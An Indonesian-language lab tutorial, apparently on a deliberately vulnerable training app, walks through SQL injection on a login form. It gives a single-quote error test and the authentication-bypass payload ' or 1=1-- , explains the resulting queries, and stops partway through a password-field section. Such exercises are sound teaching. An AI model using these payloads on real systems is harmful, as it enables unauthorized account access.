Lesson 5
--------
### SQL Injection: Single Quote Test On Username Field
- **Step 1**    : Buka Login/Register
    ![](/assets/lesson-5/login-register.png)
- **Step 2**    : Ketik `'` di kolom **Name**    
- **Step 3**    : Klik Login
    ![](/assets/lesson-5/quote_test.png)
- **Step 4**    : Anda akan mendapatkan error, jika terjadi error setelah anda login dengan **Name** `'`, berarti backend dari sistem rentan terhadap SQL Injection
    ![](/assets/lesson-5/quote_test_error.png)
    - Query yang dihasilkan:
    ```
    SELECT * FROM accounts WHERE username=''' AND password=''
    ```
    - Query Normal:
    ```
    SELECT * FROM accounts WHERE username='admin' AND password='adminpass'
    ```
    
### SQL Injection: By-Pass Password Without Username (Obtain Access #1)
- **Step 1**    : Buka Login/Register
- **Step 2**    : Ketik `' or 1=1-- ` di kolom **Name** dengan spasi di akhir `-- `
- **Step 3**    : Klik Login
    ![](/laporan-1/assets/lesson-5/login2.png)
- **Step 4**    : Anda akan berhasil login dengan akun Admin karena Admin berada pada urutan paling atas pada database. Dengan kondisi `1=1` maka akan menghasilkan kondisi yang selalu benar dan `-- ` berguna untuk comment pada SQL, karena itu query selanjutnya akan dibatalkan **(AND password='')**.
    ![](/laporan-1/assets/lesson-5/login2_berhasil.png)
    - Query yang dihasilkan:
    ```
    SELECT * FROM accounts WHERE username='' or 1=1-- ' AND password=''
    ```
    - Query yang sebenarnya dikerjakan:
    ```
    SELECT * FROM accounts WHERE username='' or 1=1
    ```
    
### SQL Injection: Single Quote Test On Password Field
- **Step 1**    : Buka Login/Register
- **Step 2**    : Ketik `samurai` di kolom **Name**
- **Step 3**    : Klik Kanan di kolom **Password**
- **step 4**    : Klik **Inspect Element**





    